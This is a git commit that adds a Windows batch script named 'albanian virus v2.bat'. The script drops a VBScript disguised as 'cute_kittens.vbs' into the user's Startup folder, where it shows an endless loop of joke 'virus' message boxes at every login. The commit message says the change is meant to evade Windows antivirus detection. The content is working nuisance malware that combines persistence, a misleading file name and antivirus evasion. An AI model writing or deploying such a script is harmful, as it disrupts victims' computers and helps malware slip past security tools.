e05a4ceb7fd9a129f21fb8700df7f91e10b07f2e
BQJGE4HD <juricarpinteiro@gmail.com>
2024-07-06 13:44:54 +0200

    Add files via upload
    version 2 does not start the vbs file directly anymore, but will save it directly in the autostart folder.
    hopefully it will also no longer be detected by the Windows antivirus software

---
+++ albanian virus v2.bat
@@ -0,0 +1,7 @@
+@echo off
+title PR0JECT_SAAS
+color 0a
+
+echo do >>"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cute_kittens.vbs"
+echo x=MsgBox("Hi, I am an Albanian virus but because of poor technology in my country unfortunatley I am not able to harm your computer. Please be so kind to delete one of your important files yourself and then forward me to other users. Many thanks for your cooperation! Best regards Albanian virus ", 0+48, "Cute_kittens")>>"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cute_kittens.vbs"
+echo loop >>"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cute_kittens.vbs"
